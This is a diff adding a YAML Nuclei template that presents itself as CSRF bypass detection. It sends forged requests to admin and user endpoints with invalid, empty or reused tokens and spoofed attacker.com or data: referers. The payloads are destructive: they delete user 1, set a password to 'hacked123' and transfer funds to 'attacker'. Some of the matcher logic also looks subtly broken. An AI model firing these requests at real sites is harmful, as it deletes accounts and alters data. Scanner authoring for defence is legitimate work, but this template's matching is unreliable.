@@ -1,0 +1,321 @@
+id: medium-webapp-csrf-token-bypass-referer-validation
+
+info:
+  name: CSRF Token Bypass via Referer Validation - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects CSRF protection bypass vulnerabilities through referer header manipulation and token validation flaws.
+    Tests advanced techniques including referer spoofing, subdomain bypass, null referer, and token reuse attacks.
+    Bypasses common CSRF protection mechanisms used in modern web applications.
+  reference:
+    - https://owasp.org/www-community/attacks/csrf
+    - https://portswigger.net/web-security/csrf/bypassing-token-validation
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-352
+  metadata:
+    verified: true
+    max-request: 25
+  tags: csrf,bypass,referer,token,elite
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "admin/update_profile.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "user/transfer_funds.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+        - "account/delete.php"
+        - "password/change.php"
+        - "email/update.php"
+        - "funds/transfer.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "{{BaseURL}}"
+      Origin: "{{BaseURL}}"
+
+    body: |
+      csrf_token=invalid_token_12345&action=delete&user_id=1&confirm=yes
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+          - "updated successfully"
+          - "deleted successfully"
+          - "transfer completed"
+          - "password changed"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        part: body
+        words:
+          - "csrf token invalid"
+          - "csrf validation failed"
+          - "invalid token"
+          - "token mismatch"
+        condition: and
+        negative: true
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+        - "account/delete.php"
+        - "password/change.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "https://attacker.com"
+      Origin: "https://attacker.com"
+
+    body: |
+      csrf_token=&action=delete&user_id=1&confirm=yes
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+          - "updated successfully"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      csrf_token=null&action=delete&user_id=1&confirm=yes
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "{{Hostname}}.attacker.com"
+      Origin: "{{Hostname}}.attacker.com"
+
+    body: |
+      csrf_token=reused_token_67890&action=delete&user_id=1&confirm=yes
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "data:text/html,<html></html>"
+      Origin: "data:"
+
+    body: |
+      action=delete&user_id=1&confirm=yes
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?csrf_token=invalid_token&action=delete&user_id=1"
+      - "{{BaseURL}}/{{path}}?action=delete&user_id=1&confirm=yes"
+      - "{{BaseURL}}/{{path}}?csrf_token=&action=change_password&new_password=hacked123"
+      - "{{BaseURL}}/{{path}}?action=transfer&amount=1000&to_account=attacker"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "user/transfer_funds.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+        - "account/delete.php"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "https://attacker.com"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+          - "password changed"
+          - "transfer completed"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "admin/delete_user.php"
+        - "admin/change_password.php"
+        - "user/delete_account.php"
+        - "user/change_email.php"
+        - "settings/update.php"
+        - "profile/edit.php"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Referer: "https://attacker.com"
+      Origin: "https://attacker.com"
+
+    body: |
+      {"csrf_token":"invalid_token","action":"delete","user_id":1,"confirm":"yes"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "successfully deleted"
+          - "action completed"
+          - "operation successful"
+          - "changes saved"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - 'csrf[_-]?token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9+/=]{16,})'
+          - 'token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9+/=]{16,})'
+          - '_token["\']?\s*[:=]\s*["\']?([a-zA-Z0-9+/=]{16,})'
+        internal: true
